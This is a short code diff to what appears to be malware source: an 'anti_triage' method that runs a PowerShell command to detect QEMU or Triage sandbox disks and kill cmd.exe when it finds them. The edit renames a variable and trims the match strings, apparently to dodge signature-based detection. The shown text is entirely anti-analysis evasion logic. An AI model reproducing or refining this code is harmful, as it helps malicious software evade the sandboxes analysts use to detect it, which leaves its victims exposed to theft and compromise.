@@ -63,7 +63,7 @@ class AntiChanges:
     @staticmethod
     def anti_triage():
         code = [
-            '''powershell "$d = wmic diskdrive get model;if ($d -like '*DADY HARDDISK*' -or $d -like '*QEMU HARDDISK*') { taskkill /f /im cmd.exe }"''',
+            '''powershell "$KDOT = wmic diskdrive get model;if ($KDOT -like '*ADY HARDDISK*' -or $KDOT -like '*EMU HARDDISK*') { taskkill /f /im cmd.exe }"''',
         ]
         return random.choice(code)
 
